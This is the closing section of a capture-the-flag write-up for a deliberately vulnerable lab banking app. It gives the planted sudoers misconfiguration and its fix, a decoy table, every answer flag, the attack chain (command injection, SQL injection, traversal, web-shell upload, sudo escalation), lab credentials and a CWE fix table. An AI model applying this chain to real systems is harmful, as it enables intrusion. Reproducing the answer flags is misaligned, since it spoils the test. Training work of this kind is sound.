### 9.6 install.sh confirms

```bash
printf '#!/usr/bin/env python3\nimport os\nprint("cleanup")\n' > /opt/scripts/cleanup.py
chown ngb:ngb /opt/scripts/cleanup.py
chmod 644 /opt/scripts/cleanup.py
printf 'ngb ALL=(root) NOPASSWD: /usr/bin/python3 /opt/scripts/cleanup.py\n' > /etc/sudoers.d/ngb-cleanup
```

### 9.7 Fix

```bash
chown root:root /opt/scripts/cleanup.py
chmod 755 /opt/scripts/cleanup.py
# Remove NOPASSWD for scripts the caller can modify
```

---

## All decoys found

| Decoy | Location | Value |
|---|---|---|
| HTML comment | Home page | `TMH{typo_decoy_b117}` |
| HTML comment | `/` bank | `DECOY{homepage_comment_false_lead}` |
| Secrets rows | `secrets` DB | `DECOY{synthetic_decoy_0001..1000}` (1000 rows) |
| `/tmp/flag.txt` | File | `DECOY{tmp_marker_false_lead_01}` |
| `/tmp/cyber-bank-metrics.txt` | File | `DECOY{metrics_cache_false_lead_01}` |
| `/var/backups/legacy-settlement.txt` | File | `DECOY{legacy_settlement_false_lead_02}` |
| `/opt/app/reports/archive/settlement-archive.txt` | File | `DECOY{report_archive_false_lead_03}` |
| `/opt/app/data/legacy-banner.txt` | File | `DECOY{seed_banner_false_lead_04}` |
| `/opt/app/.git-old/README.md` | File | `DECOY{old_backup_false_lead}` |
| `/opt/app/.env.bak` | File | `DECOY{config_backup_false_lead}` |
| `smoke_shell.php.jpg` | Uploads | `demo` (not a flag) |
| Tickets 1–20000 | DB | Synthetic audit records |

**Rule:** only `ASH{...}` is a real flag. Every `DECOY{...}` and `TMH{...}` is bait.

---

## All flags — copy-paste version

```
Task 1  ASH{f00th0ld_f1rst_cr0wn_n3xt}
Task 2  ASH{qu3ry_1nc3pt10n_str1k3s_tw1c3}
Task 3  ASH{c00k13_m0nst3r_g03s_4dm1n}
Task 4  ASH{b4ckt1ck_wh1sp3r3r_pwns_sh3ll}
Task 5  ASH{d0ubl3_d0t_d0d63_th3_gu4rd}
Task 6  ASH{t1ck3t_sw4p_un10cks_th3_thr0n3}
Task 7  ASH{ch4ng3m3123_w4s_n3v3r_s4f3}
Task 8  ASH{ph4nt0m_jp6_sh3ll_1n_pl41n_s1ght}
Task 9  ASH{sud0_s41d_y3s_r00t_s41d_th4nks}
```

---

## Full attack chain

```
Recon (nmap, arp-scan)
    ↓
Login as analyst (analyst / analyst from HTML)
    ↓
Gobuster → /diagnostics, /download, /search/save+run, /admin (403)
    ↓
Task 4 — CMDi on /diagnostics (`&&` bypass) → RCE as ngb
    ↓
Read source → JWT_SECRET = 'changeme123'
    ↓
Task 1 — cat /home/helpdesk/user.txt
    ↓
Task 2 — SQLi → dump secrets → sqli_flag
    ↓
Task 5 — /download (traversal + catch fallback)
    ↓
Task 8 — upload .php.jpg → /uploads/*.php?cmd=
    ↓
Task 9 — overwrite /opt/scripts/cleanup.py → sudo → root.txt
    ↓
Staff vhost login (admin / AdminLab!2026)
    ↓
Task 6 — /admin/dashboard
Task 3 — /admin/private-notes
Task 7 — /admin/settings
```

---

## Vulnerability summary

| Task | CWE | Root Cause | Fix |
|---|---|---|---|
| 1 | N/A | World-readable flag outside webroot | `chmod 600` |
| 2 | CWE-89 | SQL passed to `mysql -e` | Parameterized queries |
| 3 | CWE-79 | Insufficient escaping; trusted cookie session | CSP, HttpOnly, escape on write |
| 4 | CWE-78 | `exec('ping ' + host)` | `execFile` + allowlist |
| 5 | CWE-22 | Single-pass filter + catch leaks flag | `path.resolve` + prefix check |
| 6 | CWE-639/287 | No ownership check; role from JWT | DB checks |
| 7 | CWE-798 | `JWT_SECRET = 'changeme123'` | Env secret, exp claim, rotate |
| 8 | CWE-434 | No extension/MIME check; `.php` executes | Allowlist, magic bytes, no exec |
| 9 | CWE-732 | Sudo NOPASSWD on ngb-writable script | Root-owned, no NOPASSWD |

That's the complete room — every command, every response, every source snippet, every fix.
